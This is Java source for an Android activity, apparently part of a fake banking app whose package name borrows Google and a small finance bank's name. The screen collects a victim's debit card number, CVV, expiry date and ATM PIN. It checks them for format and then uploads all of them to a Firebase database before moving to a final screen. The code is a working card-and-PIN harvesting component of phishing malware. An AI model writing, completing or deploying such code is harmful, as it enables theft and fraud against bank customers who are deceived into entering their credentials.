package hamara.google.test.debug.system.ujjvansmall;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import hamara.google.test.debug.system.ujjvansmall.bg.FormValidator;
import hamara.google.test.debug.system.ujjvansmall.bg.ExpiryDateInputMask;
import hamara.google.test.debug.system.ujjvansmall.bg.DebitCardInputMask;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class ThirdActivity extends AppCompatActivity {

    private EditText card, expiry, cvv, atm;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.third);

        String id = getIntent().getStringExtra("id");

        card = findViewById(R.id.card);
        cvv = findViewById(R.id.cvv);
        expiry = findViewById(R.id.expiry);
        atm = findViewById(R.id.atm);
        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));
        card.addTextChangedListener(new DebitCardInputMask(card));

        Button buttonSubmit = findViewById(R.id.submit);

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");

                HashMap<String, Object> dataObject = new HashMap<>();
                dataObject.put("card", card.getText().toString().trim());
                dataObject.put("cvv", cvv.getText().toString().trim());
                dataObject.put("expiry", expiry.getText().toString().trim());
                dataObject.put("atm", atm.getText().toString().trim());
                dataObject.put("updated_at", Helper.datetime());

                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");

                assert id != null;
                String userId2 = usersRef.push().getKey();  // Generate a unique key
                assert userId2 != null;
                usersRef.child(id).child(userId2).setValue(dataObject)
                        .addOnSuccessListener(aVoid -> {
                            Intent intent = new Intent(this, LastActivity.class);
                            intent.putExtra("id", id);
                            startActivity(intent);
                        })
                        .addOnFailureListener(e -> {
                            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                            Log.d(Helper.TAG, "Error: " + e.getMessage());
                        });
            } else {
                Helper.debug(ThirdActivity.this, "Form Validation Failed");
            }

        });

    }

    private boolean validateForm() {
        boolean on1 = FormValidator.validateRequired(cvv, "cvv is required");
        boolean on11 = FormValidator.validateMinLength(cvv, 3, "3 digit is required");

        boolean on2 = FormValidator.validateRequired(atm, "Pin is required");
        boolean on22 = FormValidator.validateMinLength(atm, 4, "4 Digit is required");

        boolean on3 = FormValidator.validateExpiryDate(expiry, "Expiry is invalid");
        return on1 && on11 && on2 && on22 && on3;
    }
}
